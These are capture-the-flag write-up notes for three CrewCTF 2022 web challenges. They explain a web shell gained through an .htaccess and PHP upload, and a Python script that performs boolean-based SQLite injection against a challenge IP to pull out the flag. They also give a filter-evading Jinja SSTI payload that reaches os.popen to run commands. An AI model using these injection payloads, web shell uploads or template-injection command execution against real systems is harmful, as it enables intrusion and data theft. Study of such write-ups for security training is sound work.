### Template for web
#### File uploading with .htaccess

##### Problem: Uploadz - CrewCTF 2022

Server is using .htaccess with mod_rewrite to rewrite the request url to any php files or files outside of allowed directories to the /index.php. It allows upload arbitrary files to the server.
##### Technique
- Uploading the .htaccess file to a subdir with content: `RewriteEngine On` :enable the mod rewrite in subdir, it will inherit the outside .htaccess then redirect any request to php file to the location subdir/index.php
- Uploading the index.php contains malicious code to that subdir -> got web shell

#### Boolean-based SQLite Injection
##### Problem: Marvel Pick and Marvel Pick Again - CrewCTF 2022

Server is using API to request to a SQLite service that is vulnerable to SQL injection, filters some characters

##### Technique
- Using boolean based and concatinating strings, if the string equals "ironman", the server returns != vote_count, else it returns 0 vote_counte, from that, we can etract every characters of the flag

##### Proof Of Concept
```
import requests
import threading
from string import ascii_lowercase, digits

payloads = ascii_lowercase + digits + '_{}'
result = "create_table_characters____id_integer_primary_key___name_textnotnull"
flag = ""
arr = [""] * 500

def exploit(c, i):
  global flag
  burp0_url = f"http://34.126.83.114:3390/api.php?character=iron'||caSe+when+subStr((seLect+value+from+flags),{i},1)is'{c}'then'm'end||'an"
  burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "http://34.126.83.114:1337/", "Origin": "http://34.126.83.114:1337", "Connection": "close", "DNT": "1", "Sec-GPC": "1"}
  res = requests.get(burp0_url, headers=burp0_headers)
  if res.json()['data']['vote_count'] != 0:
    flag += c
    print(flag)
    return 1

for i in range(1,500):
  for c in payloads:
    
    if exploit(c, i) == 1: break
#crew{so_its_n0t_on3_line_for_exp}
#crew{y3sss_y0u_g0t_m3_h1_1_st4rn_n_n1n0}
```

#### SSTI with filters

##### Problem - Ez Chall - CrewCTF 2022
Server allowed SSTI but heavily filters the input, no Out Of Band technique

##### Technique
- Since it doesn't filter some important keyword like : cycler, session, ... I can use the below payload for setting the flag in the session

```
{% set x=session.update({"a":cycler["__in" "it__"]["__glo" "bals__"]["os"]["popen"]("rev /flag")["re" "ad"]()})%}
```
